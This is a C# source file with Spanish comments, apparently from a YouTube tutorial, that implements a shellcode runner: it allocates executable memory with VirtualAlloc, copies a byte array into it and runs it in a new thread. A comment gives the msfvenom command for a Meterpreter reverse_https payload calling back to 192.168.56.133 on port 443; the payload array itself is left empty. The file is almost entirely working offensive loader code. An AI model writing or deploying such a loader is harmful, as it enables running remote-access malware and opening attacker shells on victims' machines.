using System;
using System.Runtime.InteropServices;

namespace EjecucionDeShellcode
{
    class Program
    {
        /*
        Ejemplo del video: https://youtu.be/BJTTJcZnpng
        Por: PlainText
        */
        
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags, 
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle, 
            UInt32 dwMilliseconds);

        public const uint MEM_COMMIT = 0x00001000;
        public const uint MEM_RESERVE = 0x00002000;

        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Shellcode
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.133 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[] {};

            // Crear un espacio en la memoria para guardar el shelloce
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Console.WriteLine("[+] Espacio de memoria creado, con la direccion :  0x{0:X16}", (addr).ToInt64());

            // Copiar el Shellcode al espacio de memoria creado
            Marshal.Copy(buf, 0, addr, buf.Length);

            // Crear un thread (hilo) que ejecute el shellcode en el espacio de memoria creado
            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // No cerrar el programa 
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
